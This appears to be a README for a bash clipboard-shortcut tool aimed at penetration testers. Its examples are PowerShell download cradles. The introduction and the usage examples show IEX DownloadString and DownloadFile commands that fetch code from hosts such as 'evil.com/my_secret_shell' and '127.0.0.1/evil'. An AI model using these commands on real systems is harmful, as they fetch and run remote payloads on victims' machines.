## Introduction

Shakti is simple solution for typing long repetitive commands. How many times you have to type IEX(New-object Net.WebClient).DownloadString('http://evil.com/my_secret_shell') and at the end you did typo. Would not be better to quickly jump to another pane in your tmux session and type few commands and have exactly thing you need on your clipboard?


## Background

I tried to brush my bash scripting skill a little and I want to create some useful application for me. Also I tried use native linux application and. As db is simple file where I use awk command to pull information I need. 

## Usage

List command will print out all shortcut you created.


```
./shakti.sh list

Shortcut :psds
Command: echo -n "IEX(New-Object Net.WebClient).DownloadString(\"$2\")"| xclip -selection clipboard;echo "Copied"

Description: Powershell IEX Download String
```

There is a quite command. Lets analyze it. It will print our IEX string where $2 will substitute for anything you input after **./shakti.sh psds** because we used **|** our string it will not be copied on terminal but into our clipboard. And them we see echo command to print info on terminal. So lets test it :) 

```
$ ./shakti.sh psds 'http://192.168.1.200/frienly_app'
Copied
```

It did worked! Lets create shortcut on our own. Lets call it psdf and it will print IEX DownloadFile command on screen.

```bash
$ ./shakti.sh add psdf 'echo "IEX(New-Object Net.WebClient).DownloadFile(\"$2\",\"$3\")"' 'Powershell Download Files'                                                                      
Shortcut psdf added
$ ./shakti.sh psdf 'http://127.0.0.1/evil' 'C:\windows\tmp\very_nice_app'
IEX(New-Object Net.WebClient).DownloadFile("http://127.0.0.1/evil","C:\windows\tmp\very_nice_app")
```

If command already exist in database it will get overwrite.
There is also option for deleting your shortcut with option del.
